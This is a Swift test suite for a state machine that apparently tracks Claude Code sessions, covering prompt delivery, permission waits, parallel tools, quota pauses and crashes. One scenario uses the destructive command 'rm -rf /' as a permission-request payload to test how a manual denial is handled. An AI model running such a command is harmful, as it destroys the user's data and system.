        waiting.send(.deliveryStarted(delivery))
        #expect(waiting.r.pendingDelivery == nil)

        var offline = Harness()
        offline.send(.deliveryStarted(delivery))
        #expect(offline.r.pendingDelivery == nil)

        var degraded = Harness()
        degraded.send(.processStarted(pid: Harness.pid, startedAt: Harness.t0, withInitialPrompt: false))
        degraded.tick(after: 15)
        #expect(degraded.r.phase == .idle && degraded.r.hookHealth == .degraded)
        degraded.send(.deliveryStarted(delivery))
        #expect(degraded.r.pendingDelivery == nil)
    }

    /// T30b: a launch with a positional prompt (the first post-it) is typed by Claude Code itself. Its delivery is
    /// recorded while that prompt is not submitted yet (launching, or thinking after SessionStart, hooks known or
    /// not), and its UserPromptSubmit confirms it (T4).
    @Test func t30b_positionalPromptDeliveryIsConfirmedByItsPrompt() {
        let prefix = AgentStateMachine.normalizedPromptPrefix("Corrige le bug du login")
        let delivery = PendingDelivery(itemID: "card-1", prefix: prefix, startedAt: Harness.t0, hookSeqAtStart: 0)
        var h = Harness()
        h.send(.processStarted(pid: Harness.pid, startedAt: Harness.t0, withInitialPrompt: true))
        #expect(h.send(.deliveryStarted(delivery)).isEmpty)
        #expect(h.r.pendingDelivery == delivery)
        h.hook(.sessionStart, .sessionStart(source: .startup, model: nil))
        #expect(h.r.phase == .thinking)
        #expect(h.r.pendingDelivery == delivery)
        #expect(h.submit("Corrige le bug du login", prompt: "P1") == [.card(.deliveryConfirmed(promptID: "P1"))])
        #expect(h.r.pendingDelivery == nil)

        // Recorded after SessionStart too, before the prompt is submitted.
        var late = Harness.running(withPrompt: true)
        late.send(.deliveryStarted(delivery))
        #expect(late.r.pendingDelivery == delivery)

        // Not once the positional prompt is submitted, nor for a launch without one, nor twice.
        var submitted = Harness.running(withPrompt: true)
        submitted.submit("Corrige le bug du login")
        submitted.send(.deliveryStarted(delivery))
        #expect(submitted.r.pendingDelivery == nil)
        var plain = Harness()
        plain.send(.processStarted(pid: Harness.pid, startedAt: Harness.t0, withInitialPrompt: false))
        plain.send(.deliveryStarted(delivery))
        #expect(plain.r.pendingDelivery == nil)
        var twice = Harness.running(withPrompt: true)
        twice.send(.deliveryStarted(delivery))
        let other = PendingDelivery(itemID: "card-2", prefix: "x", startedAt: Harness.t0, hookSeqAtStart: 0)
        twice.send(.deliveryStarted(other))
        #expect(twice.r.pendingDelivery == delivery)
    }

    /// T30b: the positional prompt settled without matching (another first prompt, or a Stop or a StopFailure with no
    /// UserPromptSubmit at all) fails its delivery as T31 would: the dispatcher runs no plan for it, so nothing else
    /// would ever end it. An ordinary delivery is left to the dispatcher's own wait.
    @Test func t30b_positionalDeliveryFailsWhenItsPromptIsNotSeen() {
        let delivery = PendingDelivery(itemID: "card-1", prefix: "Corrige le bug", startedAt: Harness.t0,
                                       hookSeqAtStart: 0)
        let failed: [AgentEffect] = [.card(.deliveryFailed(.noPromptSubmit)), .setQueuePaused(true)]

        var other = Harness.running(withPrompt: true)
        other.send(.deliveryStarted(delivery))
        #expect(other.submit("Autre chose", prompt: "P1") == failed)
        #expect(other.r.pendingDelivery == nil)

        var stopped = Harness.running(withPrompt: true)
        stopped.send(.deliveryStarted(delivery))
        #expect(stopped.stop() == failed)
        #expect(stopped.r.pendingDelivery == nil)

        var broken = Harness.running(withPrompt: true)
        broken.send(.deliveryStarted(delivery))
        let fx = broken.stopFailure("overloaded")
        #expect(Array(fx.prefix(2)) == failed)
        #expect(broken.r.pendingDelivery == nil)

        var ordinary = Harness.running()
        ordinary.send(.deliveryStarted(delivery))
        #expect(ordinary.submit("Autre chose", prompt: "P1").isEmpty)
        #expect(ordinary.r.pendingDelivery == delivery)
    }

    /// T21 during a delivery (the positional one of a launch whose exec failed): the card is told, as on an exit.
    @Test func t21_failedLaunchFailsItsDelivery() {
        var h = Harness()
        h.send(.processStarted(pid: Harness.pid, startedAt: Harness.t0, withInitialPrompt: true))
        h.send(.deliveryStarted(PendingDelivery(itemID: "card-1", prefix: "x", startedAt: h.now, hookSeqAtStart: 0)))
        #expect(h.send(.processFailedToStart("code 127")) == [.card(.deliveryFailed(.processGone))])
        #expect(h.r.pendingDelivery == nil)
        #expect(h.send(.processFailedToStart("code 127")).isEmpty)
    }

    @Test func t31_abortedDeliveryFailsTheCardAndPausesTheQueue() {
        var h = Harness.running()
        h.send(.deliveryStarted(PendingDelivery(itemID: "card-1", prefix: "x", startedAt: h.now, hookSeqAtStart: 1)))
        let fx = h.send(.deliveryAborted(.guardFailed("dialogue visible")))
        #expect(fx == [.card(.deliveryFailed(.guardFailed("dialogue visible"))), .setQueuePaused(true)])
        #expect(h.r.pendingDelivery == nil)
        #expect(h.send(.deliveryAborted(.noPromptSubmit)).isEmpty)
    }

    // MARK: - Scenarios

    @Test func scenarioFullPermissionTurn() {
        var h = Harness()
        h.send(.processStarted(pid: Harness.pid, startedAt: Harness.t0, withInitialPrompt: false))
        h.tick()
        h.hook(.sessionStart, .sessionStart(source: .startup, model: "opus"))
        #expect(h.display.title == "Au repos")

        let prefix = AgentStateMachine.normalizedPromptPrefix("Lance les tests et corrige")
        h.send(.deliveryStarted(PendingDelivery(itemID: "card-1", prefix: prefix, startedAt: h.now, hookSeqAtStart: h.r.hookSeq)))
        h.advance(0.5)
        #expect(h.submit("Lance les tests et corrige", prompt: "P1") == [.card(.deliveryConfirmed(promptID: "P1"))])
        #expect(h.display.title == "Réfléchit")

        h.advance(2)
        h.pre("Bash", "t1", "npm test")
        h.permission("Bash", "t1", "npm test")
        #expect(h.display.kind == .waitingInput)
        #expect(h.display.title == "Attend ta réponse")
        #expect(h.display.detail == "Bash : npm test")
        h.advance(4)
        h.send(.userKeystroke(.printable))
        h.notification("permission_prompt")  // the ~6 s catch-up: already known
        #expect(h.r.pendingWaits.count == 1)

        h.advance(1)
        h.post("Bash", "t1")
        h.batch()
        #expect(h.display.title == "Réfléchit")
        h.pre("Edit", "t2", "src/app.ts")
        #expect(h.display.detail == "modification")
        h.post("Edit", "t2")
        h.batch()
        h.stop()
        #expect(h.display.title == "Tour terminé")
        h.tick()
        h.tick()
        h.tick()
        h.send(.acknowledged)
        #expect(h.display.title == "Au repos")

        let expected: [AgentEffect] = [
            .recordProcess(ProcessStamp(pid: Harness.pid, startedAt: Harness.t0)),
            .recordSession(SessionRef(sessionID: "S1", cwd: "/p", startedAt: Harness.t0 + 1, source: .startup, model: "opus")),
            .card(.deliveryConfirmed(promptID: "P1")),
            .notify(.waiting(.permission(tool: "Bash", summary: "npm test"))), .playSound(.alert),
            .announce("attend ta réponse"),
            .card(.turnCommitted(promptID: "P1")), .playSound(.done), .notify(.turnDone), .pumpQueue(afterSeconds: 1.5),
        ]
        #expect(h.log == expected)
    }

    /// Three parallel tools, only B needs a permission. Each tool's own events keep their causal order
    /// (hooks are synchronous), but tools interleave arbitrarily.
    @Test(arguments: UInt64(1)...UInt64(20))
    func scenarioParallelToolsInAnyInterleaving(seed: UInt64) {
        var rng = SplitMix64(seed: seed)
        typealias Event = (HookEventName, HookPayload)
        var perTool: [[Event]] = [
            [(.preToolUse, .preToolUse(tool: "Bash", toolUseID: "tA", summary: "ls")),
             (.postToolUse, .postToolUse(tool: "Bash", toolUseID: "tA", failed: false))],
            [(.preToolUse, .preToolUse(tool: "Edit", toolUseID: "tB", summary: "header.tsx")),
             (.permissionRequest, .permissionRequest(tool: "Edit", toolUseID: nil, summary: "header.tsx"))],
            [(.preToolUse, .preToolUse(tool: "Read", toolUseID: "tC", summary: "README.md")),
             (.postToolUseFailure, .postToolUse(tool: "Read", toolUseID: "tC", failed: true))],
        ]
        var h = Harness.thinking()
        while perTool.contains(where: { !$0.isEmpty }) {
            let candidates = perTool.indices.filter { !perTool[$0].isEmpty }
            let pick = candidates[Int(rng.next() % UInt64(candidates.count))]
            let (name, payload) = perTool[pick].removeFirst()
            h.advance(0.01)
            h.hook(name, payload)
        }
        #expect(h.r.pendingWaits.keys.map { $0 } == [.tool(toolUseID: "tB")])
        #expect(h.display.title == "Attend ta réponse")
        #expect(h.display.detail == "Edit : header.tsx")
        #expect(h.r.phase == .working(.edit))
        #expect(h.r.inFlightKinds == ["tB": .edit])
        #expect(h.log.filter(\.isNotify).count == 1)

        h.post("Edit", "tB")
        h.batch()
        #expect(h.r.state == .phase(.thinking))
    }

    /// Three parallel calls of the same tool, only A needs a permission (documented: without tool_use_id). Whatever
    /// the interleaving, the wait survives its siblings' results. With `inputRewritten`, the request's input
    /// matches no call (another hook rewrote it): the wait still outlives every sibling.
    @Test(arguments: UInt64(1)...UInt64(20), [false, true])
    func scenarioParallelCallsOfOneToolInAnyInterleaving(seed: UInt64, inputRewritten: Bool) {
        var rng = SplitMix64(seed: seed &* 104_729)
        typealias Event = (HookEventName, HookPayload)
        var perTool: [[Event]] = [
            [(.preToolUse, .preToolUse(tool: "Read", toolUseID: "A", summary: "/etc/hosts")),
             (.permissionRequest, .permissionRequest(tool: "Read", toolUseID: nil,
                                                     summary: inputRewritten ? "/etc/hosts.orig" : "/etc/hosts"))],
            [(.preToolUse, .preToolUse(tool: "Read", toolUseID: "B", summary: "/p/src/x")),
             (.postToolUse, .postToolUse(tool: "Read", toolUseID: "B", failed: false))],
            [(.preToolUse, .preToolUse(tool: "Read", toolUseID: "C", summary: "/p/README.md")),
             (.postToolUseFailure, .postToolUse(tool: "Read", toolUseID: "C", failed: true))],
        ]
        var h = Harness.thinking()
        while perTool.contains(where: { !$0.isEmpty }) {
            let candidates = perTool.indices.filter { !perTool[$0].isEmpty }
            let pick = candidates[Int(rng.next() % UInt64(candidates.count))]
            let (name, payload) = perTool[pick].removeFirst()
            h.advance(0.01)
            h.hook(name, payload)
        }
        #expect(h.r.pendingWaits.count == 1)
        #expect(h.r.phase == .working(.read))
        if !inputRewritten { #expect(h.r.pendingWaits.keys.map { $0 } == [.tool(toolUseID: "A")]) }
        #expect(h.log.filter(\.isNotify).count == 1)
        h.post("Read", "A")
        #expect(h.r.state == .phase(.thinking))
    }

    /// Worst case: even events of one tool arrive shuffled. The batch still settles everything.
    @Test(arguments: UInt64(1)...UInt64(20))
    func scenarioParallelToolsFullyShuffledThenBatch(seed: UInt64) {
        var rng = SplitMix64(seed: seed &* 7919)
        let events: [(HookEventName, HookPayload)] = [
            (.preToolUse, .preToolUse(tool: "Bash", toolUseID: "tA", summary: "ls")),
            (.postToolUse, .postToolUse(tool: "Bash", toolUseID: "tA", failed: false)),
            (.preToolUse, .preToolUse(tool: "Edit", toolUseID: "tB", summary: "header.tsx")),
            (.permissionRequest, .permissionRequest(tool: "Edit", toolUseID: nil, summary: "header.tsx")),
            (.postToolUse, .postToolUse(tool: "Edit", toolUseID: "tB", failed: false)),
            (.preToolUse, .preToolUse(tool: "Read", toolUseID: "tC", summary: "README.md")),
            (.postToolUse, .postToolUse(tool: "Read", toolUseID: "tC", failed: false)),
        ].shuffled(using: &rng)
        var h = Harness.thinking()
        for (name, payload) in events {
            h.advance(0.01)
            h.hook(name, payload)
        }
        h.batch()
        #expect(h.r.state == .phase(.thinking))
        #expect(h.r.inFlightTools.isEmpty)
        #expect(h.log.filter(\.isNotify).count == 1)
    }

    @Test func scenarioSubagentWaitsWhileMainWorks() {
        var h = Harness.thinking()
        h.pre("Agent", "a1", "Audit sécurité")
        h.hook(.subagentStart, .subagent(started: true, type: "general-purpose"), sub: "sub-1")
        h.pre("Bash", "s1", "npm audit", sub: "sub-1")
        h.permission("Bash", nil, "npm audit", sub: "sub-1")
        #expect(h.display.kind == .waitingInput)
        #expect(h.display.badges == ["1 sous-agent"])
        // The main agent keeps working in parallel, with the same tool too.
        h.pre("Read", "r1", "package.json")
        #expect(h.r.phase == .working(.read))
        h.post("Read", "r1")
        h.pre("Bash", "m1", "npm ls")
        h.post("Bash", "m1")
        #expect(h.r.phase == .working(.subagent))
        #expect(h.display.kind == .waitingInput)
        h.post("Bash", "s1", sub: "sub-1")
        #expect(h.display.kind == .working)
        h.hook(.subagentStop, .subagent(started: false, type: "general-purpose"), sub: "sub-1")
        h.post("Agent", "a1")
        #expect(h.r.state == .phase(.thinking))
        #expect(h.r.activeSubagents == 0)
    }

    @Test func scenarioManualDenialIsLiftedByPostToolBatch() {
        var h = Harness.thinking()
        h.pre("Bash", "t1", "rm -rf /")
        h.permission("Bash", "t1", "rm -rf /")
        #expect(h.r.kind == .waitingInput)
        // "No" chosen in the terminal: neither PostToolUse nor PermissionDenied.
        h.advance(3)
        h.batch()
        #expect(h.r.state == .phase(.thinking))
        #expect(h.r.inFlightTools.isEmpty)
    }

    @Test func scenarioBlockingStopHookReopensTheSamePrompt() {
        var h = Harness.thinking()
        // Within the quiet window: the provisional Stop is simply dropped.
        h.stop()
        h.advance(1)
        h.pre("Bash", "t1", "npm test", prompt: "P1")
        h.post("Bash", "t1", prompt: "P1")
        h.stop(active: true)
        #expect(h.tick(after: 3).isEmpty)
        #expect(h.tick(after: 3).contains(.card(.turnCommitted(promptID: "P1"))))
        // After the commit (a slow Stop hook): the card is reopened, then committed again.
        h.advance(2)
        h.pre("Bash", "t2", "npm run lint", prompt: "P1")
        h.post("Bash", "t2", prompt: "P1")
        h.stop(active: true)
        h.tick(after: 6)
        let cards = h.log.compactMap(\.cardSignal)
        #expect(cards == [.turnCommitted(promptID: "P1"), .turnReopened(promptID: "P1"), .turnCommitted(promptID: "P1")])
    }

    @Test func scenarioBackgroundTasksNeverPumpTheQueue() {
        var h = Harness.thinking()
        h.stopAndCommit(bg: 1)
        #expect(h.display.title == "Attend une tâche de fond")
        let delivery = PendingDelivery(itemID: "card-2", prefix: "x", startedAt: h.now, hookSeqAtStart: h.r.hookSeq)
        h.send(.deliveryStarted(delivery))
        #expect(h.r.pendingDelivery == nil)
        for _ in 0..<700 { h.tick() }
        #expect(h.r.phase == .waitingBackground(tasks: 1, crons: 0))
        // The background task ends and Claude Code starts a turn on its own.
        h.pre("Read", "t9", "build.log", prompt: "P1b")
        #expect(h.r.phase == .working(.read))
        h.post("Read", "t9", prompt: "P1b")
        let fx = h.stopAndCommit(prompt: "P1b")
        #expect(fx.contains(.pumpQueue(afterSeconds: 1.5)))
        #expect(h.log.filter(\.isPump).count == 1)
    }

    @Test func scenarioQuotaPauseAndAutomaticResume() {
        var h = Harness.thinking()
        h.pre("Bash", "t1", "npm test")
        h.stopFailure("rate_limit")
        #expect(h.display.title == "En pause : limite d'usage")
        #expect(h.display.kind == .quotaPaused)
        #expect(h.send(.userInterrupt).isEmpty)
        h.send(.deliveryStarted(PendingDelivery(itemID: "c", prefix: "x", startedAt: h.now, hookSeqAtStart: 1)))
        #expect(h.r.pendingDelivery == nil)
        for _ in 0..<30 { h.tick(after: 60) }
        #expect(h.r.phase == .quotaPaused(resetAt: nil, autoResume: true))
        #expect(h.notification("quota_auto_resume_fired") == [.clearGlobalIssue(.quota)])
        h.pre("Bash", "t2", "npm test")
        h.post("Bash", "t2")
        let fx = h.stopAndCommit()
        #expect(fx.contains(.pumpQueue(afterSeconds: 1.5)))
    }

    @Test func scenarioInterruptSucceedsThenGivesUp() {
        var h = Harness.thinking()
        h.pre("Bash", "t1", "sleep 600")
        h.send(.userInterrupt)
        h.tick(after: 1)
        #expect(h.r.state == .phase(.idle))
        // A new turn; this time ESC is swallowed (a footer item was selected).
        h.submit("Reprends", prompt: "P2")
        h.pre("Bash", "t2", "sleep 600")
        h.advance(1)
        h.send(.userInterrupt)
        for _ in 0..<3 {
            h.advance(0.5)
            h.send(.outputActivity)
            h.tick(after: 0.5)
        }
        #expect(h.r.phase == .working(.bash))
        #expect(h.log.last == .showMessage("L'interruption n'a pas pris : ouvre le terminal"))
        #expect(h.log.filter { $0 == .card(.interrupted) }.count == 2)
    }

    @Test func scenarioCloseVersusCrash() {
        var closed = Harness.thinking()
        closed.send(.closeRequested)
        closed.send(.processExited(code: nil))
        #expect(closed.r.phase == .offline(.closedByUser))
        #expect(closed.log.filter(\.isNotify).isEmpty)

        var crashed = Harness.thinking()
        crashed.send(.processExited(code: nil))
        #expect(crashed.r.phase == .error(.crashed(nil)))
        #expect(crashed.log.contains(.notify(.error(.crashed(nil)))))

        // A relaunch after a close does not remember the close.
        closed.send(.processStarted(pid: 99, startedAt: closed.now, withInitialPrompt: false))
        closed.send(.processExited(code: 2))
        #expect(closed.r.phase == .error(.crashed(2)))
    }

    @Test func scenarioDegradedMode() {
        var h = Harness()
        h.send(.processStarted(pid: Harness.pid, startedAt: Harness.t0, withInitialPrompt: false))
        h.send(.screen(ScreenFacts(inputBox: .empty, recognized: true)))
        h.tick(after: 15)
        #expect(h.r.hookHealth == .degraded)
        #expect(h.display.title == "Au repos")
        #expect(h.display.badges == ["mode dégradé"])
        // PTY activity: working; silence: idle. No thinking/working distinction.
        h.advance(1)
        h.send(.outputActivity)
        #expect(h.r.phase == .working(.other("activité")))
        #expect(h.tick(after: 1).isEmpty)
        #expect(h.r.phase == .working(.other("activité")))
        h.tick(after: 1)
        #expect(h.r.phase == .idle)
        // A bell is the only waiting signal.
        #expect(h.send(.bell) == newWaitEffects(.terminal))
        #expect(h.send(.bell).isEmpty)
        h.advance(3)
        h.send(.screen(ScreenFacts(inputBox: .empty, recognized: true)))
        #expect(h.r.pendingWaits.isEmpty)
        // Hooks come back: normal mode.
        h.submit("Bonjour", prompt: "P1")
        #expect(h.r.hookHealth == .healthy)
        #expect(h.r.phase == .thinking)
        h.send(.bell)
        #expect(h.r.pendingWaits.isEmpty)
        h.tick(after: 5)
        #expect(h.r.phase == .thinking)
    }

    /// Random inputs in any state: the reducer never traps and keeps its invariants.
    @Test(arguments: [UInt64(1), 2, 3, 4, 5])
    func randomInputsKeepInvariants(seed: UInt64) {
        var rng = SplitMix64(seed: seed)
        func pick<T>(_ items: [T]) -> T { items[Int(rng.next() % UInt64(items.count))] }
        let tools = ["Bash", "Edit", "Read", "Agent", "AskUserQuestion", "mcp__x__y"]
        let ids = ["t1", "t2", "t3", "s1"]
        let subs: [String?] = [nil, nil, nil, "sub-1"]
        let prompts: [String?] = [nil, "P1", "P2"]
        var h = Harness()
        for _ in 0..<3_000 {
            let sub = pick(subs)
            let input: AgentInput
            switch rng.next() % 26 {
            case 0: input = .processStarted(pid: Harness.pid, startedAt: h.now, withInitialPrompt: rng.next() % 2 == 0)
            case 1: input = .processExited(code: pick([0, 1, nil]))
            case 2: input = .screen(ScreenFacts(inputBox: pick([.empty, .unknown, .draft(prefix: "a")]),
                                                dialogVisible: rng.next() % 2 == 0, spinnerVisible: rng.next() % 2 == 0,
                                                recognized: rng.next() % 3 != 0))
            case 3: input = .userInterrupt
            case 4: input = .userKeystroke(pick([.printable, .escape]))
            case 5: input = .outputActivity
            case 6: input = .bell
            case 7, 8, 9: input = .tick
            case 10: input = .deliveryStarted(PendingDelivery(itemID: "c", prefix: "Go", startedAt: h.now, hookSeqAtStart: h.seq))
            case 11: input = .deliveryAborted(.noPromptSubmit)
            case 12: input = .acknowledged
            case 13: input = .closeRequested
            default:
                let payload: HookPayload = pick([
                    .sessionStart(source: pick([.startup, .clear, .compact, .resume]), model: nil),
                    .sessionEnd(reason: "clear"),
                    .userPromptSubmit(promptHead: "Go on", promptLength: 5),
                    .preToolUse(tool: pick(tools), toolUseID: pick(ids), summary: "x"),
                    .postToolUse(tool: pick(tools), toolUseID: pick(ids), failed: false),
                    .postToolBatch,
                    .permissionRequest(tool: pick(tools), toolUseID: pick(ids), summary: "x"),
                    .notification(type: pick(["permission_prompt", "idle_prompt", "quota_auto_resume_fired",
                                              "quota_auto_resume_stale", "quota_auto_resume_disabled"]), message: nil),
                    .stop(lastMessageHead: nil, stopHookActive: rng.next() % 2 == 0, backgroundTasks: pick([0, 0, 1]),
                          sessionCrons: pick([0, 0, 1])),
                    .stopFailure(errorType: pick(["rate_limit", "overloaded", "billing_error"]), message: nil),
                    .subagent(started: rng.next() % 2 == 0, type: nil),
                    .elicitation(server: nil, id: pick(ids), message: "?"),
                    .elicitationResult(server: nil, id: pick(ids)),
                ])
                h.seq += 1
                input = .hook(HookEvent(name: .other("Random"), sessionID: pick(["S1", "S2"]), promptID: pick(prompts),
                                        subagentID: sub, payload: payload), seq: h.seq)
            }
            h.advance(TimeInterval(rng.next() % 4000) / 1000)
            h.send(input)
            let r = h.r
            #expect(r.activeSubagents >= 0)
            if r.pid == nil {
                #expect(r.pendingWaits.isEmpty && r.inFlightTools.isEmpty && r.pendingStop == nil)
                #expect(r.pendingDelivery == nil && r.interruptRequestedAt == nil)
                #expect(r.escapedDialogAt == nil)
            }
            if r.pendingStop != nil {
                #expect(r.phase == .done || r.phase == .idle)
            }
            if r.pendingWaits.isEmpty { #expect(!r.acknowledgedWaiting) }
            #expect(r.phaseSince <= h.now)
        }
    }
}
